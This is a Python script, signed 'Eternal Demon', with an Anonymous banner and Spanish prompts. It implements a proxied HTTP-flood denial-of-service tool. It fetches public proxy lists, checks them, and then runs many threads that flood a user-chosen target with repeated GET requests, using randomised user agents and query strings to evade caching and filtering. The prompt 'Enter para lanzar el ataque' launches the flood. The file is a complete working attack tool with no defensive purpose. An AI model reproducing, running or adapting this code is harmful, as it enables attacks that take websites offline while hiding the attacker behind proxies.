import colorama
from colorama import Fore
import time
import socket
import random
import requests
import threading
import sys
import os
colorama.init()

os.system("clear")
print('''\033[95m
                                                                                    
                              *@@@&(,        .,#@@@@*                              
                        .&@#                          .%@@.                        
                     %@,                                   /@&                     
                  %@                                          .@&                 
               .@/                ...............                #@,              
              @*     ,&@.    ..    .     .     .    ..    .@%.     (@.             
            %#  .&.@@@,   ....  .    .   .        . .  ..   *@@&,&.  @&          
          @,  &@ @% %  .     .    ....&#.&@,..    .      .  & &@.@#  *@.          
          @  @.@#.@@/ ..     .     .     .@*   .     .     .  (@& %@ @ .@          
         @, @@,@@% / .      ....   .     ,     .   ....      . # &@@ @@ /@         
        (#  @@.*#@# .                   *@,           .         @@/* @@  &%       
        @.,,@@#@@   .      .      .      .      .     ..      .   @@#@@/.*@       
        @ &@ @@ %/  .      .      .  / .%@@,.(  .      .      .  #(.@@ @# @        
        @ *@&.,@@   .      .  ./%@@@@#  ,&,  #@@@#,    .      .  .@@* @@. @.       
        @  %@%&@,*  .      . #@@@@@@@(   @.  %@@@@@@@@.       .  //@%@@( .@        
        &*(*.@@#.@.  .      ,@@@@@@@@@  ,@% .@@@@@@@@@/      .  ,@ %@@ (*(@        
        .@ @@(.%#@(   . .   (@@@@@@@@@@ /@@ @@@@@@@@@@&  .. .   %@(& %@&.@,        
         /% (@@%/@@,#  .    @@@@@@@@@@@@@@@@@@@@@@@@@@@    .  % @@*&@@* @(         
         /% &.@@@@ &@   . *@@@@@@@@@@@@@@@@@@@@@@@@@@@* .   @%.@@@&.@ @#"          
           ,@ %@@,.%.@@ ,  %@@@@@@@@@@@@@@@@@@@@@@@@@@@#  , @@ %.*@@# @*           
            @( ,@@@@#&@*%@/@@@@@@@@@@@@@@@@@@@@@@@@@@@&@#(@%%@@@@, #@             
               @* @#. ,(%@ &@@@@@@@@@@@@@@@@@@@@@@@@@@@%.@%/, .%& #@.              
                &&  &@@@@@@@@&#@@@@@@@@@@@@@@@@@@((&@@@@@@@@%. @@                 
                    .@# /@%#&@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&@* &@,                   
                       %@/     @@@@@@@@@@@@@@@@@@@&      #@@.                      
                          ,@@&@@@@@@@@@@@@@@@@@@@@*&@@*                           
                                   ,(%@@@@@@@%#,                                                                                                              
                        ╔═╗╔╗╔╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦ ╦╔═╗
                        ╠═╣║║║║ ║║║║╚╦╝║║║║ ║║ ║╚═╗
                        ╩ ╩╝╚╝╚═╝╝╚╝ ╩ ╩ ╩╚═╝╚═╝╚═╝
                                  
                                                                                       ╔═╗┬    ┌─┐┌─┐┌┐┌┌─┐┌─┐┬┌┬┐┬┌─┐┌┐┌┌┬┐┌─┐  ┌─┐┌─┐  ┬  ┬┌┐ ┬─┐┌─
                                                                                       ║╣ │    │  │ │││││ ││  │││││├┤ │││ │ │ │  ├┤ └─┐  │  │├┴┐├┬┘├┤  
                                                                                       ╚═╝┴─┘  └─┘└─┘┘└┘└─┘└─┘┴┴ ┴┴└─┘┘└┘ ┴ └─┘  └─┘└─┘  ┴─┘┴└─┘┴└─└─┘o
                                                                                       ╔═╗┌─┐┌┬┐┌─┐┌─┐  ╔═╗┌┐┌┌┐┌┬┌┬┐┌─┐┌─┐                            
                                                                                       ╚═╗│ │││││ │└─┐  ╠═╣│││││││││││ │└─┐                            
                                                                                       ╚═╝└─┘┴ ┴└─┘└─┘  ╩ ╩┘└┘┘└┘┴┴ ┴└─┘└─┘o                           
                                                                                       ╔═╗┌─┐┌┬┐┌─┐┌─┐  ╦  ┌─┐┌─┐┬┌┐┌                                  
                                                                                       ╚═╗│ │││││ │└─┐  ║  ├┤ │ ┬││││                                  
                                                                                       ╚═╝└─┘┴ ┴└─┘└─┘  ╩═╝└─┘└─┘┴┘└┘o                                 
                                                                                       ╔╗╔┌─┐  ┌─┐┌─┐┬─┐┌┬┐┌─┐┌┐┌┌─┐┌┬┐┌─┐┌─┐                          
                                                                                       ║║║│ │  ├─┘├┤ ├┬┘ │││ ││││├─┤││││ │└─┐                          
                                                                                       ╝╚╝└─┘  ┴  └─┘┴└──┴┘└─┘┘└┘┴ ┴┴ ┴└─┘└─┘o                         
                                                                                       ╔╗╔┌─┐  ┌─┐┬ ┬  ┬┬┌┬┐┌─┐┌┬┐┌─┐┌─┐                               
                                                                                       ║║║│ │  │ ││ └┐┌┘│ ││├─┤││││ │└─┐                               
                                                                                       ╝╚╝└─┘  └─┘┴─┘└┘ ┴─┴┘┴ ┴┴ ┴└─┘└─┘o                              
                                                                                      ╔═╗┌─┐┌─┐┬─┐┌─┐┌┐┌┌─┐┌─┐┬                                       
                                                                                      ║╣ └─┐├─┘├┬┘├─┤││││ │└─┐│                                       
                                                                                      ╚═╝└─┘┴  ┴└─┴ ┴┘└┘└─┘└─┘o                                       
''')


userag =["Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
acpt =["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n","Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]

def checking(lines): 
	global nums
	global pprr
	proxy = lines.strip().split(":")
	try:
		s = socket.socket()
		s.settimeout(1) 
		s.connect((str(proxy[0]), int(proxy[1])))
		s.send(str.encode("GET / HTTP/1.1\r\nHost: "+url+":"+str(port)+"\r\n\r\n"))
		s.close()
	except:
		pprr.remove(lines)
	nums = nums + 1

def check_proxy(): 
	global nums
	global pprr
	nums = 0
	thread_list=[]
	for lines in list(pprr):
		th = threading.Thread(target=checking,args=(lines,))
		th.start()
		thread_list.append(th)
		time.sleep(0.03)
		sys.stdout.write("\033[32m Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\nTOTAL DE PROXYES:"+str(len(pprr)))
	ans = input("Guardar lista de proxyes? (y/n)")
	if ans == "y":
		in_file = str(input("Poner lista de proxyes(proxyes.txt):"))
		if in_file == "":
			in_file = "proxyes.txt"
		with open(in_file, 'wb') as fp:
			for lines in list(pprr):
				fp.write(bytes(lines,encoding='utf8'))
		fp.close()
on = False
def main():
	global url
	global port
	global pprr
	global times
	global urll
	url = str(input("\033[91mTarget : "))
	urll = str(input("Path (Default Is /) : "))
	if urll == "":
		urll = '/'
	sl = str(input("Usar SSL Mode ? (y/n) : "))
	port = str(input("Port(default=80) : "))
	if port == "":
		port = 80
		print("Port 80")
	else:
		port = int(port)
	thr = int(input("Threads : "))
	times = str(input("Elija cantidad (1-100, default=70) : "))
	if times == "":
		times = int(70)
	else:
		times = int(times)
	cho = str(input("Obtener proxyes ? (y/n) : "))                                                           
	if cho =='y':
		if sl =='y':
			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all') 
			with open("proxyes.txt","wb") as fp:
				fp.write(rsp.content)
				print("Proxyes obtenidos ")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all')
			with open("proxyes.txt","wb") as fp:
				fp.write(rsp.content)
				print("Proxyes obtenidos ")
	else:
		pass
	file = str(input("Ponga la lista de proxyes (proxyes.txt) : "))
	if file == "":
		file = "proxyes.txt"
	pprr = open(file).readlines()
	print("Numero de Proxyes %d" % len(pprr))
	ans = str(input("Comprobar proxyes(y/n):"))
	if ans == "y":
		check_proxy()
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads "+str(i+1)+" Creados")
	print("Conectando con los proxyes")
	time.sleep(5)
	input("Enter para lanzar el ataque")
	global on
	on = True


def atk():
	get_host = "GET " + str(urll) + "?="+ str(random.randint(1,65535)) +" HTTP/1.1\r\nHost: " + str(url)+ ":" + str(port) +"\r\n"
	connection = "Connection: Keep-Alive\r\n"
	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                              
	accept = random.choice(acpt)
	rqs = get_host + useragent + accept + connection + "\r\n"
	
	proxy = random.choice(pprr).strip().split(":")
	time.sleep(5)
	while True:
		while on:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(proxy[0]), int(proxy[1]))) 
				s.send(str.encode(rqs))
				try:
					for i in range(times):                                                          
						s.send(str.encode(rqs))
					print("\033[95m Paquetes enviados \033[91m ~ [ "  + str(proxy[0])+":"+str(proxy[1]) + " ]  \033[91m BY Eternal Demon") 
					s.close()
				except:
					s.close()
			except:
				s.close()
				print( "\033[91m [-] Proxies ERROR [-]")

if __name__ =='__main__':
	main()
